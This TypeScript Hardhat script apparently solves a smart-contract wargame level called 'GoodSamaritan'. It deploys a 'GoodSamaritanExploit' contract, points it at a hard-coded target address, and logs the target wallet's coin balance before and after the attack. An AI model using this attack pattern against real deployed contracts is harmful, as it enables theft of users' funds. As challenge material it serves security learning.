import { ethers } from "hardhat";

const targetContractAddress = "0xa2301Df2EB891869c6d80e44F15De110E368365d";

const main = async () => {
  const signer = (await ethers.getSigners())[0];
  const signerAddress = await signer.getAddress();

  const target = await ethers.getContractAt("GoodSamaritan", targetContractAddress);

  const ExploitFactory = await ethers.getContractFactory("GoodSamaritanExploit");
  const exploit = await ExploitFactory.deploy();

  await exploit.waitForDeployment();
  console.log(`Exploit Deployed on Address: ${await exploit.getAddress()}`);

  const targetCoin = await ethers.getContractAt("Coin", await target.coin());

  console.log("Samaritans Coin Balance: ", await targetCoin.balances(await target.wallet()));

  const tx = await exploit.exploit(targetContractAddress);
  await tx.wait();

  console.log("Samaritans Coin Balance: ", await targetCoin.balances(await target.wallet()));
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
